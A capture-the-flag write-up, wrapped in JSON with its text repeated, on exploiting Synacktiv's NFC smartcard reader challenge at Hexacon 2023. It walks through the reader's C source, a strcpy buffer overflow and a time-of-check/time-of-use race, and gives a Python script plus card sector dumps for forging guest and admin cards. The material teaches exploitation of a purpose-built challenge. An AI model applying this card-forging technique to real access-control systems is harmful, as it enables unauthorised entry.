{"title":"Hexacon23 Synacktiv CTF","markdown":{"yaml":{"title":"Hexacon23 Synacktiv CTF","date":"2023-10-25"},"headingText":"'78eae65a206ad5631fc11748edeb2f84a01723b32c7b9adbe1a6311f207ea2bf'","containsRefs":false,"markdown":"\n\nAt the 2023 edition of [hexacon](https://www.hexacon.fr/) there were various CTF challenges, one of which organized at the venue by the event's organizer, Synacktiv. \nIt involved a smartcard reader attached to small computer and a screen, and a stack of smartcards.\nThe goal of the challenge is to somehow authenticate as admin, which should pop up a specific message on the screen that shows \"Waiting for NFC tag...\" in @fig-setup.\n\n![CTF setup](setup.jpg){#fig-setup}\n\n\nWe grabbed one card from the stack on the bottom left and read it out using [MIFARE Classic Tool](https://f-droid.org/packages/de.syss.MifareClassicTool/).\nFortunately it used one of the standard keys included in the application.\nThe dump showed some data in sectors 1, 2 and 3 as shown in @fig-card.\n\n![Card contents](card.png){width=50% #fig-card}\n\nThe sectors 1 and 3 contain some interesting strings as shown in @lst-card1.\n\n```{.default #lst-card1 lst-cap=\"Data in card\"}\n0000  68 65 78 61 63 6f 6e 5f  67 75 65 73 74 00 00 00  |hexacon_guest...|\n0010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n0030  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n0040  0b 5f 6a 80 4d ad d1 4b  53 14 58 58 f2 6b 7d f0  |._j.M..KS.XX.k}.|\n0050  ba 62 dd 2f 89 44 0e 14  5c 35 2b db 00 c8 09 0a  |.b./.D..\\5+.....|\n0060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n0070  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n0080  68 74 74 70 73 3a 2f 2f  74 69 6e 79 75 72 6c 2e  |https://tinyurl.|\n0090  63 6f 6d 2f 33 6e 76 6d  66 65 61 75 00 00 00 00  |com/3nvmfeau....|\n00a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00b0  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n```\n\nThe [URL](https://tinyurl.com/3nvmfeau) brings us to a zip archive containing files shown in @lst-archive.\nThis is a subset of the code running on the small computer, handling the data read from the card's sectors.\n\n```{.default #lst-archive lst-cap=\"Archive contents\"}\n.\n├── README.md\n└─── src\n    ├── include\n    │   ├── ipc.h\n    │   ├── main.h\n    │   ├── nfc.h\n    │   └── util.h\n    ├── main.c\n    └── util.c\n```\n\nThe `README.md` explains the challenge:\n\n```default\nDear Hexacon guest,\n\nIf you read these lines, you probably visited the Synacktiv stand \nand some ninjas might have briefed you.\n\nOtherwise, the goal is to exploit vulnerabilities inside the NFC \nreader to authenticate successfully as admin.\n\nThe sources of the challenge are available into the `src/` directory.\n\nNB: Some files such as `ipc.c` and `nfc.C` which implement some \nused functions are not part of the archive, this is intended, as \nthey are not needed to complete the challenge.\n\nHave fun ! o/\n```\n\nThe `main` (@lst-main) of the application, initializes an admin token stored in the filesystem of the machine with `get_admin_token` and then enters a reading loop.\nWhen presented a card, the `notify` calls update messages on the screen.\n\n```{.C #lst-main lst-cap=\"`main` and `get_admin_token` functions\"}\n#include \"main.h\"\n#include \"util.h\"\n#include \"nfc.h\"\n\nuint8_t admin_token[TOKEN_SIZE];\n\ncontext_t context;\n\nuint8_t key[KEY_SIZE];\nuint32_t iterations;\n\nint main(int argc, char *argv[]) {\n\n    // Retrieve secret\n    if (get_admin_token(admin_token)) {\n        printf(\"[-] Failed to retrieve secret\\n\");\n        notify(UNEXPECTED_FAIL);\n        return -1;\n    }\n\n    for (;;) {\n\n        iterations = 1000;\n\n        // Retrieve NFC card username\n        read_card(&context);\n\n        if (derive_key(admin_token, iterations, key) == 0) {\n            notify(UNEXPECTED_FAIL);\n            sleep(2);\n            continue;\n        }\n\n        status_t status = check_token(&context, admin_token, key);\n\n        notify(status);\n\n        if (status == VALID_TOKEN) {\n            sleep(1);\n\n            if (!strcmp(context.username, ADMIN_USERNAME)) {\n                notify(ADMIN_AUTH);\n            } else {\n                notify(GUEST_AUTH);\n            }\n\n            sleep(1);\n        }\n\n        sleep(2);\n    }\n\n    return 0;\n}\n\nint get_admin_token(char * admin_token)\n{\n    FILE * fd;\n    size_t count;\n    \n    if ((fd = fopen(\"data/admin_token.bin\", \"rb\")) == NULL) {\n        perror(\"fopen\");\n        return -1;\n    }\n\n    if ((count = fread(admin_token, 1, TOKEN_SIZE, fd)) != TOKEN_SIZE) {\n        perror(\"fread\");\n        return -1;\n    } \n\n    fclose(fd);\n\n    return 0;\n}\n```\n\n`read_card` (@lst-read-card) moves data from the card's sectors into the global `context`.\nThis function contains the first potential vulnerability, as it uses `strcpy` to move the content from the third sector. This function will keep reading data from the card until a 0-byte is encountered.\n\n```{.C #lst-read-card lst-cap=\"`read_card` function\"}\nvoid read_card(context_t *ctx)\n{\n    uint8_t sectors[SECTORS_COUNT * BLOCKS_COUNT * BLOCK_SIZE];\n\n    read_nfc_tag(sectors);\n\n    // Read username\n    strncpy(ctx->username, read_sector(sectors, 1), USERNAME_SIZE - 1);\n\n    // Read token\n    memcpy(ctx->token, read_sector(sectors, 2), TOKEN_SIZE);\n\n    // Read data\n    strcpy(ctx->data, read_sector(sectors, 3));\n}\n```\n\nThe `data` field in the `context` structure has space for the amount of data (0x30 bytes) of sector 3.\n`context` is stored in the globals together with the `admin_token`, `key` and `iterations` (see @lst-main).\nSo by overflowing the `data` field we can overwrite `key` and `iterations`.\n`iterations` determines the amount of hash iterations are performed in the `PKCS5_PKBDF2_HMAC` key derivation step in `derive_key` (see @lst-derive-key).\n\n```{.C #lst-derive-key lst-cap=\"`derive_key` function\"}\nint derive_key(char * admin_token, uint32_t iterations, char * key)\n{\n    return PKCS5_PBKDF2_HMAC(\n        admin_token, // pass\n        TOKEN_SIZE, // passlen\n        NULL, // salt\n        0, // saltlen\n        iterations, // iter\n        EVP_sha256(), // digest\n        KEY_SIZE, // keylen\n        key // out\n    );\n}\n``` \n\nIf we can obtain the `admin_token`, we can create a card where the `username` is `hexacon_admin` and the `token` is `admin_token`.\nThis should lead us to the authenticated admin screen.\n\nIn a normal run `iterations` is set to `1000` (see @lst-main), which  is not very high for a proper key derivation system.\nSo it could be that `admin_token` is some brute-forcible string that could be found in a wordlist, as the `salt` input is set to `NULL`.\nWith the overflow we could change the amount of iterations to `1`, so then just a single `SHA256` hash is calculated over the password.\nHowever it is more likely that the designer of the challenge just put a random `0x20` byte string in there.\nIn this case even bruteforcing a single 256-bit hash is not feasible.\n\nWe considered setting `iterations` to `0`, so that perhaps no hash is calculated at all. \nThis case is normaly caught by the [OpenSSL implementation](https://www.openssl.org/docs/manmaster/man3/PKCS5_PBKDF2_HMAC.html) that was likely used, looking at the function signature.\nSo this would not work either.\n\nIn the `compute_token` function (@lst-compute-token), the `key[]` array, resulting from `derive_key` function, is used to perform authentication by XORing it with the `SHA256` hash of the provided `username`, stored in sector 1 of the card.\n\n```{.C #lst-compute-token lst-cap=\"`compute_token` and `check_token` functions\"}\nint compute_token(context_t *ctx, char * key, char * token)\n{\n    char to_sign[USERNAME_SIZE] = {};\n\n    memcpy(to_sign, ctx->username, USERNAME_SIZE);\n\n    if (SHA256(to_sign, strlen(ctx->username), token) == NULL) {\n        return -1;\n    }\n\n    for (int i = 0; i < TOKEN_SIZE; i++) {\n        token[i] ^= key[i];\n    }\n\n    return 0;\n}\n\nstatus_t check_token(context_t * ctx, uint8_t * admin_token, uint8_t * key)\n{\n    if (!strcmp(ctx->username, ADMIN_USERNAME)) {\n        // Admin authentication\n        if (memcmp(ctx->token, admin_token, TOKEN_SIZE)) {\n            return INVALID_TOKEN;\n        }\n    } else {\n        // Regular guest authentication\n        \n        // Read card with token to check authenticity\n        read_card(ctx);\n\n        uint8_t expected_token[TOKEN_SIZE] = {};\n\n        if (compute_token(ctx, key, expected_token)) {\n            return UNEXPECTED_FAIL;\n        }\n\n        #ifdef DEBUG\n        ...\n        #endif\n\n        if (memcmp(ctx->token, expected_token, TOKEN_SIZE)) {\n            return INVALID_TOKEN;\n        }\n    }\n\n    return VALID_TOKEN;\n}\n```\n\nThe unmodified card passes the token checks as guest, as shown on the screen, so we know that the token in sector 2 matches the username in sector 3.\nTherefore, we can calculate the value of `key` by simply XORing it with the hash of the `username` from sector 1 as shown below. \n\n```{.Python #lst-token-check lst-cap=\"Code to recover authentication key\"}\ntoken = bytes.fromhex(\n    '0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A')\nkey = bytes(a ^ b for a, b in zip(token, sha256(b'hexacon_guest').digest()))\nprint(f'{key.hex()}')\n\n```\n\nWe can now forge tokens for any `username`, including `hexacon_admin`, which should pop up the `notify(ADMIN_AUTH)`.\nHowever, if we set `username` like this, the `check_token` function (@lst-compute-token) will take a different path where it compares against the `admin_token`, which we still don't know, and also cannot reach with the `strcpy` overflow.\n\nThen we noticed the application reads a second time from the card while in the non-admin branch of `check_token`, which will refill the global `context` structure.\nThis means the application contains a [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) type vulnerability where some checks are performed on one copy of the data, and then performs actions based on another copy of the data.\nNamely, the check on `username` to reach the right branch is performed on the first copy from the card, while the check in the `main` loop, which determines which final message we reach, is performed on the second read.\nSo if we can switch the `username` portion of the card's data fast enough, we can reach the right branch in `check_token` while setting the username to `hexacon_admin` and triggering the `notify(ADMIN_AUTH)`.\nWith something like a [Proxmark](https://github.com/Proxmark/proxmark3) or a [Flipper Zero](https://docs.flipper.net/nfc/read) it's probably possible to switch between card data fast enough.\nAlternatively, we could simply use two cards, write the different `username`s with matching `token`s, and switch them in between reads, if we are fast enough.\nHowever, our ninja skills were fast enough :(\n\nRecall the `iterations` variable that we could overwrite with the overflow.\nThis determines the amount of times the pseudorandom function (`HMAC` in this case) is applied on the potentially weak password input in the `PBKDF2_HMAC` function.\nSetting this value really high, rather than really low, also means more computation time is needed in the application reading the cards.\nFurthermore, this calculation is performed between the two card reads, so this might give us enough time to manually switch between two cards.\n\n```C\nint main(int argc, char *argv[]) {\n\t...\n    for (;;) {\n        ...\n        // v- first card read\n        read_card(&context); \n\n        // v- PBKDF in here\n        if (derive_key(admin_token, iterations, key) == 0) { \n            ... \n        }\n        // v- second card read in here\n        status_t status = check_token(&context, admin_token, key); \n        ...\n        if (status == VALID_TOKEN) {\n            if (!strcmp(context.username, ADMIN_USERNAME)) {\n                notify(ADMIN_AUTH);\n            } else {\n                notify(GUEST_AUTH);\n            }\n        }\n    }\n}\n```\n\nWe now need to set up two cards in the following way to combine both the buffer overflow and the TOCTOU bugs:\n\n- One card will contain any `username` string in sector 1 that is not `hexacon_admin`.\nThis card needs to trigger the overflow to overwrite `iterations`. By doing this, it will also overwrite `key[]`, so we need to replace the `token` in sector 2 such that it matches with the overwritten `key[]`.\nDue to the offsets, the last 0x10 bytes of sector 3 will end up in `key[]` which contain some special values.\nThe function `read_nfc_tag` from `nfc.h` warns us that \"_the NFC tag A key MUST be \"FFFFFFFFFFFF\"_\", which refers to to the light green portion of @fig-card.\nWe just left all those bytes as they were, so we recalculated the `token` as shown in @lst-token-check, i.e. `token = sha256(username) ^ key`.\nThe first 0x10 bytes of sector 4 will be the second half of the key, we just filled this with 0xff-bytes.\nThen the following 4 bytes of sector 4 can be used to control the `iterations` variable to something large like `0xffffffff`.\n- The second card will contain the `hexacon_admin` string in the `username`'s sector 1.\nThis card will need also a valid token matching the previously overwritten `key[]`, which is generated following the same `token = sha256(username) ^ key` calculation. \n\nBy presenting first the guest card, and then swapping to the admin card while the `PBKDF2_HMAC` calculation is working, we should land on the `notify(ADMIN_AUTH)` page.\n\nThe Python script in @lst-card-data generates the data for both cards' sectors. @lst-card-data-out shows the data for the relevant card sectors.\n\n```{.Python #lst-card-data lst-cap=\"Code to generate the card data that exploits the vulnerabilities\"}\nfrom hashlib import sha256\n\nkey_suffix = 'FFFFFFFFFFFFFF078069FFFFFFFFFFFF'\n\n# Calculate original key, output of pbkdf with unknown password \n# and empty salt\ntoken1 = sha256(b'hexacon_guest').digest()\ntoken2 = bytes.fromhex(\n    '0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A')\nkey = bytes(a ^ b for a, b in zip(token1, token2))\n\n# Calculate data for first card with hexacon_guest username\ntoken3 = sha256(b'hexacon_guest').digest()\nkey2 = bytes.fromhex(key_suffix) + b'\\xff'*0x10\ntoken4 = bytes(a ^ b for a, b in zip(token3, key2))\n\nprint('guest card')\n\nprint()\nprint('Sector 2 token')\nprint()\nprint(token4[:16].hex().upper())\nprint(token4[16:].hex().upper())\nprint('00'*16)\nprint(key_suffix)\nprint()\nprint('Sector 3 data')\nprint()\n\nprint((b'A'*0x10).hex().upper())\nprint((b'A'*0x10).hex().upper())\nprint((b'A'*0x10).hex().upper())\nprint(key_suffix)\nprint()\n\nprint('Sector 4 overflow')\n\nprint('FF'*16) # Second half of key\nprint('FF'*4 + '00'*12) # iterations value\nprint('00'*16)\nprint(key_suffix)\nprint()\n\nprint('admin card')\n\ntoken5 = sha256(b'hexacon_admin').digest()\nkey2 = bytes.fromhex(key_suffix) + b'\\xff'*0x10\ntoken6 = bytes(a ^ b for a, b in zip(token5, key2))\n\nprint()\nprint('Sector 1 username')\nprint()\nprint(b'hexacon_admin'.hex().upper() + '00'*3)\nprint('00'*16)\nprint('00'*16)\nprint(key_suffix)\nprint()\n\nprint('Sector 2 token')\nprint()\nprint(token6[:16].hex().upper())\nprint(token6[16:].hex().upper())\nprint('00'*16)\nprint(key_suffix)\nprint()\n```\n\n```{.default #lst-card-data-out lst-cap=\"Data for both cards\"}\nguest card\n\nSector 2 token\n\n8C4A73259238FB2FCCBCB0EFE07FAD8B\nE58A01635AC06B30426CE53BDF49544A\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 3 data\n\n41414141414141414141414141414141\n41414141414141414141414141414141\n41414141414141414141414141414141\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 4 overflow\nFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\nFFFFFFFF000000000000000000000000\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nadmin card\n\nSector 1 username\n\n68657861636F6E5F61646D696E000000\n00000000000000000000000000000000\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 2 token\n\n49B0B706DBF13385983D75887C4F1061\n78BB9677F34F57110D1584800037F513\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n```\n\nEven with our slow ninja skills, we now are fast enough to see the success screen!\n\n![Flag obtained!](flag.webp){#fig-flag width=50%}\n\n\nWe were not fast enough to win the first prize, but we were fast enough to win the second prize, a very cool [o.mg.lol](https://o.mg.lol/) cable!\nGreat challenge, very creative way of triggering and using a buffer overflow!\n\n![o.mg cable](omg-cable.webp){#fig-prize width=50%}\n","srcMarkdownNoYaml":"\n\nAt the 2023 edition of [hexacon](https://www.hexacon.fr/) there were various CTF challenges, one of which organized at the venue by the event's organizer, Synacktiv. \nIt involved a smartcard reader attached to small computer and a screen, and a stack of smartcards.\nThe goal of the challenge is to somehow authenticate as admin, which should pop up a specific message on the screen that shows \"Waiting for NFC tag...\" in @fig-setup.\n\n![CTF setup](setup.jpg){#fig-setup}\n\n\nWe grabbed one card from the stack on the bottom left and read it out using [MIFARE Classic Tool](https://f-droid.org/packages/de.syss.MifareClassicTool/).\nFortunately it used one of the standard keys included in the application.\nThe dump showed some data in sectors 1, 2 and 3 as shown in @fig-card.\n\n![Card contents](card.png){width=50% #fig-card}\n\nThe sectors 1 and 3 contain some interesting strings as shown in @lst-card1.\n\n```{.default #lst-card1 lst-cap=\"Data in card\"}\n0000  68 65 78 61 63 6f 6e 5f  67 75 65 73 74 00 00 00  |hexacon_guest...|\n0010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n0030  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n0040  0b 5f 6a 80 4d ad d1 4b  53 14 58 58 f2 6b 7d f0  |._j.M..KS.XX.k}.|\n0050  ba 62 dd 2f 89 44 0e 14  5c 35 2b db 00 c8 09 0a  |.b./.D..\\5+.....|\n0060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n0070  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n0080  68 74 74 70 73 3a 2f 2f  74 69 6e 79 75 72 6c 2e  |https://tinyurl.|\n0090  63 6f 6d 2f 33 6e 76 6d  66 65 61 75 00 00 00 00  |com/3nvmfeau....|\n00a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00b0  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n```\n\nThe [URL](https://tinyurl.com/3nvmfeau) brings us to a zip archive containing files shown in @lst-archive.\nThis is a subset of the code running on the small computer, handling the data read from the card's sectors.\n\n```{.default #lst-archive lst-cap=\"Archive contents\"}\n.\n├── README.md\n└─── src\n    ├── include\n    │   ├── ipc.h\n    │   ├── main.h\n    │   ├── nfc.h\n    │   └── util.h\n    ├── main.c\n    └── util.c\n```\n\nThe `README.md` explains the challenge:\n\n```default\nDear Hexacon guest,\n\nIf you read these lines, you probably visited the Synacktiv stand \nand some ninjas might have briefed you.\n\nOtherwise, the goal is to exploit vulnerabilities inside the NFC \nreader to authenticate successfully as admin.\n\nThe sources of the challenge are available into the `src/` directory.\n\nNB: Some files such as `ipc.c` and `nfc.C` which implement some \nused functions are not part of the archive, this is intended, as \nthey are not needed to complete the challenge.\n\nHave fun ! o/\n```\n\nThe `main` (@lst-main) of the application, initializes an admin token stored in the filesystem of the machine with `get_admin_token` and then enters a reading loop.\nWhen presented a card, the `notify` calls update messages on the screen.\n\n```{.C #lst-main lst-cap=\"`main` and `get_admin_token` functions\"}\n#include \"main.h\"\n#include \"util.h\"\n#include \"nfc.h\"\n\nuint8_t admin_token[TOKEN_SIZE];\n\ncontext_t context;\n\nuint8_t key[KEY_SIZE];\nuint32_t iterations;\n\nint main(int argc, char *argv[]) {\n\n    // Retrieve secret\n    if (get_admin_token(admin_token)) {\n        printf(\"[-] Failed to retrieve secret\\n\");\n        notify(UNEXPECTED_FAIL);\n        return -1;\n    }\n\n    for (;;) {\n\n        iterations = 1000;\n\n        // Retrieve NFC card username\n        read_card(&context);\n\n        if (derive_key(admin_token, iterations, key) == 0) {\n            notify(UNEXPECTED_FAIL);\n            sleep(2);\n            continue;\n        }\n\n        status_t status = check_token(&context, admin_token, key);\n\n        notify(status);\n\n        if (status == VALID_TOKEN) {\n            sleep(1);\n\n            if (!strcmp(context.username, ADMIN_USERNAME)) {\n                notify(ADMIN_AUTH);\n            } else {\n                notify(GUEST_AUTH);\n            }\n\n            sleep(1);\n        }\n\n        sleep(2);\n    }\n\n    return 0;\n}\n\nint get_admin_token(char * admin_token)\n{\n    FILE * fd;\n    size_t count;\n    \n    if ((fd = fopen(\"data/admin_token.bin\", \"rb\")) == NULL) {\n        perror(\"fopen\");\n        return -1;\n    }\n\n    if ((count = fread(admin_token, 1, TOKEN_SIZE, fd)) != TOKEN_SIZE) {\n        perror(\"fread\");\n        return -1;\n    } \n\n    fclose(fd);\n\n    return 0;\n}\n```\n\n`read_card` (@lst-read-card) moves data from the card's sectors into the global `context`.\nThis function contains the first potential vulnerability, as it uses `strcpy` to move the content from the third sector. This function will keep reading data from the card until a 0-byte is encountered.\n\n```{.C #lst-read-card lst-cap=\"`read_card` function\"}\nvoid read_card(context_t *ctx)\n{\n    uint8_t sectors[SECTORS_COUNT * BLOCKS_COUNT * BLOCK_SIZE];\n\n    read_nfc_tag(sectors);\n\n    // Read username\n    strncpy(ctx->username, read_sector(sectors, 1), USERNAME_SIZE - 1);\n\n    // Read token\n    memcpy(ctx->token, read_sector(sectors, 2), TOKEN_SIZE);\n\n    // Read data\n    strcpy(ctx->data, read_sector(sectors, 3));\n}\n```\n\nThe `data` field in the `context` structure has space for the amount of data (0x30 bytes) of sector 3.\n`context` is stored in the globals together with the `admin_token`, `key` and `iterations` (see @lst-main).\nSo by overflowing the `data` field we can overwrite `key` and `iterations`.\n`iterations` determines the amount of hash iterations are performed in the `PKCS5_PKBDF2_HMAC` key derivation step in `derive_key` (see @lst-derive-key).\n\n```{.C #lst-derive-key lst-cap=\"`derive_key` function\"}\nint derive_key(char * admin_token, uint32_t iterations, char * key)\n{\n    return PKCS5_PBKDF2_HMAC(\n        admin_token, // pass\n        TOKEN_SIZE, // passlen\n        NULL, // salt\n        0, // saltlen\n        iterations, // iter\n        EVP_sha256(), // digest\n        KEY_SIZE, // keylen\n        key // out\n    );\n}\n``` \n\nIf we can obtain the `admin_token`, we can create a card where the `username` is `hexacon_admin` and the `token` is `admin_token`.\nThis should lead us to the authenticated admin screen.\n\nIn a normal run `iterations` is set to `1000` (see @lst-main), which  is not very high for a proper key derivation system.\nSo it could be that `admin_token` is some brute-forcible string that could be found in a wordlist, as the `salt` input is set to `NULL`.\nWith the overflow we could change the amount of iterations to `1`, so then just a single `SHA256` hash is calculated over the password.\nHowever it is more likely that the designer of the challenge just put a random `0x20` byte string in there.\nIn this case even bruteforcing a single 256-bit hash is not feasible.\n\nWe considered setting `iterations` to `0`, so that perhaps no hash is calculated at all. \nThis case is normaly caught by the [OpenSSL implementation](https://www.openssl.org/docs/manmaster/man3/PKCS5_PBKDF2_HMAC.html) that was likely used, looking at the function signature.\nSo this would not work either.\n\nIn the `compute_token` function (@lst-compute-token), the `key[]` array, resulting from `derive_key` function, is used to perform authentication by XORing it with the `SHA256` hash of the provided `username`, stored in sector 1 of the card.\n\n```{.C #lst-compute-token lst-cap=\"`compute_token` and `check_token` functions\"}\nint compute_token(context_t *ctx, char * key, char * token)\n{\n    char to_sign[USERNAME_SIZE] = {};\n\n    memcpy(to_sign, ctx->username, USERNAME_SIZE);\n\n    if (SHA256(to_sign, strlen(ctx->username), token) == NULL) {\n        return -1;\n    }\n\n    for (int i = 0; i < TOKEN_SIZE; i++) {\n        token[i] ^= key[i];\n    }\n\n    return 0;\n}\n\nstatus_t check_token(context_t * ctx, uint8_t * admin_token, uint8_t * key)\n{\n    if (!strcmp(ctx->username, ADMIN_USERNAME)) {\n        // Admin authentication\n        if (memcmp(ctx->token, admin_token, TOKEN_SIZE)) {\n            return INVALID_TOKEN;\n        }\n    } else {\n        // Regular guest authentication\n        \n        // Read card with token to check authenticity\n        read_card(ctx);\n\n        uint8_t expected_token[TOKEN_SIZE] = {};\n\n        if (compute_token(ctx, key, expected_token)) {\n            return UNEXPECTED_FAIL;\n        }\n\n        #ifdef DEBUG\n        ...\n        #endif\n\n        if (memcmp(ctx->token, expected_token, TOKEN_SIZE)) {\n            return INVALID_TOKEN;\n        }\n    }\n\n    return VALID_TOKEN;\n}\n```\n\nThe unmodified card passes the token checks as guest, as shown on the screen, so we know that the token in sector 2 matches the username in sector 3.\nTherefore, we can calculate the value of `key` by simply XORing it with the hash of the `username` from sector 1 as shown below. \n\n```{.Python #lst-token-check lst-cap=\"Code to recover authentication key\"}\ntoken = bytes.fromhex(\n    '0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A')\nkey = bytes(a ^ b for a, b in zip(token, sha256(b'hexacon_guest').digest()))\nprint(f'{key.hex()}')\n\n# '78eae65a206ad5631fc11748edeb2f84a01723b32c7b9adbe1a6311f207ea2bf' \n```\n\nWe can now forge tokens for any `username`, including `hexacon_admin`, which should pop up the `notify(ADMIN_AUTH)`.\nHowever, if we set `username` like this, the `check_token` function (@lst-compute-token) will take a different path where it compares against the `admin_token`, which we still don't know, and also cannot reach with the `strcpy` overflow.\n\nThen we noticed the application reads a second time from the card while in the non-admin branch of `check_token`, which will refill the global `context` structure.\nThis means the application contains a [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) type vulnerability where some checks are performed on one copy of the data, and then performs actions based on another copy of the data.\nNamely, the check on `username` to reach the right branch is performed on the first copy from the card, while the check in the `main` loop, which determines which final message we reach, is performed on the second read.\nSo if we can switch the `username` portion of the card's data fast enough, we can reach the right branch in `check_token` while setting the username to `hexacon_admin` and triggering the `notify(ADMIN_AUTH)`.\nWith something like a [Proxmark](https://github.com/Proxmark/proxmark3) or a [Flipper Zero](https://docs.flipper.net/nfc/read) it's probably possible to switch between card data fast enough.\nAlternatively, we could simply use two cards, write the different `username`s with matching `token`s, and switch them in between reads, if we are fast enough.\nHowever, our ninja skills were fast enough :(\n\nRecall the `iterations` variable that we could overwrite with the overflow.\nThis determines the amount of times the pseudorandom function (`HMAC` in this case) is applied on the potentially weak password input in the `PBKDF2_HMAC` function.\nSetting this value really high, rather than really low, also means more computation time is needed in the application reading the cards.\nFurthermore, this calculation is performed between the two card reads, so this might give us enough time to manually switch between two cards.\n\n```C\nint main(int argc, char *argv[]) {\n\t...\n    for (;;) {\n        ...\n        // v- first card read\n        read_card(&context); \n\n        // v- PBKDF in here\n        if (derive_key(admin_token, iterations, key) == 0) { \n            ... \n        }\n        // v- second card read in here\n        status_t status = check_token(&context, admin_token, key); \n        ...\n        if (status == VALID_TOKEN) {\n            if (!strcmp(context.username, ADMIN_USERNAME)) {\n                notify(ADMIN_AUTH);\n            } else {\n                notify(GUEST_AUTH);\n            }\n        }\n    }\n}\n```\n\nWe now need to set up two cards in the following way to combine both the buffer overflow and the TOCTOU bugs:\n\n- One card will contain any `username` string in sector 1 that is not `hexacon_admin`.\nThis card needs to trigger the overflow to overwrite `iterations`. By doing this, it will also overwrite `key[]`, so we need to replace the `token` in sector 2 such that it matches with the overwritten `key[]`.\nDue to the offsets, the last 0x10 bytes of sector 3 will end up in `key[]` which contain some special values.\nThe function `read_nfc_tag` from `nfc.h` warns us that \"_the NFC tag A key MUST be \"FFFFFFFFFFFF\"_\", which refers to to the light green portion of @fig-card.\nWe just left all those bytes as they were, so we recalculated the `token` as shown in @lst-token-check, i.e. `token = sha256(username) ^ key`.\nThe first 0x10 bytes of sector 4 will be the second half of the key, we just filled this with 0xff-bytes.\nThen the following 4 bytes of sector 4 can be used to control the `iterations` variable to something large like `0xffffffff`.\n- The second card will contain the `hexacon_admin` string in the `username`'s sector 1.\nThis card will need also a valid token matching the previously overwritten `key[]`, which is generated following the same `token = sha256(username) ^ key` calculation. \n\nBy presenting first the guest card, and then swapping to the admin card while the `PBKDF2_HMAC` calculation is working, we should land on the `notify(ADMIN_AUTH)` page.\n\nThe Python script in @lst-card-data generates the data for both cards' sectors. @lst-card-data-out shows the data for the relevant card sectors.\n\n```{.Python #lst-card-data lst-cap=\"Code to generate the card data that exploits the vulnerabilities\"}\nfrom hashlib import sha256\n\nkey_suffix = 'FFFFFFFFFFFFFF078069FFFFFFFFFFFF'\n\n# Calculate original key, output of pbkdf with unknown password \n# and empty salt\ntoken1 = sha256(b'hexacon_guest').digest()\ntoken2 = bytes.fromhex(\n    '0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A')\nkey = bytes(a ^ b for a, b in zip(token1, token2))\n\n# Calculate data for first card with hexacon_guest username\ntoken3 = sha256(b'hexacon_guest').digest()\nkey2 = bytes.fromhex(key_suffix) + b'\\xff'*0x10\ntoken4 = bytes(a ^ b for a, b in zip(token3, key2))\n\nprint('guest card')\n\nprint()\nprint('Sector 2 token')\nprint()\nprint(token4[:16].hex().upper())\nprint(token4[16:].hex().upper())\nprint('00'*16)\nprint(key_suffix)\nprint()\nprint('Sector 3 data')\nprint()\n\nprint((b'A'*0x10).hex().upper())\nprint((b'A'*0x10).hex().upper())\nprint((b'A'*0x10).hex().upper())\nprint(key_suffix)\nprint()\n\nprint('Sector 4 overflow')\n\nprint('FF'*16) # Second half of key\nprint('FF'*4 + '00'*12) # iterations value\nprint('00'*16)\nprint(key_suffix)\nprint()\n\nprint('admin card')\n\ntoken5 = sha256(b'hexacon_admin').digest()\nkey2 = bytes.fromhex(key_suffix) + b'\\xff'*0x10\ntoken6 = bytes(a ^ b for a, b in zip(token5, key2))\n\nprint()\nprint('Sector 1 username')\nprint()\nprint(b'hexacon_admin'.hex().upper() + '00'*3)\nprint('00'*16)\nprint('00'*16)\nprint(key_suffix)\nprint()\n\nprint('Sector 2 token')\nprint()\nprint(token6[:16].hex().upper())\nprint(token6[16:].hex().upper())\nprint('00'*16)\nprint(key_suffix)\nprint()\n```\n\n```{.default #lst-card-data-out lst-cap=\"Data for both cards\"}\nguest card\n\nSector 2 token\n\n8C4A73259238FB2FCCBCB0EFE07FAD8B\nE58A01635AC06B30426CE53BDF49544A\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 3 data\n\n41414141414141414141414141414141\n41414141414141414141414141414141\n41414141414141414141414141414141\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 4 overflow\nFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\nFFFFFFFF000000000000000000000000\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nadmin card\n\nSector 1 username\n\n68657861636F6E5F61646D696E000000\n00000000000000000000000000000000\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 2 token\n\n49B0B706DBF13385983D75887C4F1061\n78BB9677F34F57110D1584800037F513\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n```\n\nEven with our slow ninja skills, we now are fast enough to see the success screen!\n\n![Flag obtained!](flag.webp){#fig-flag width=50%}\n\n\nWe were not fast enough 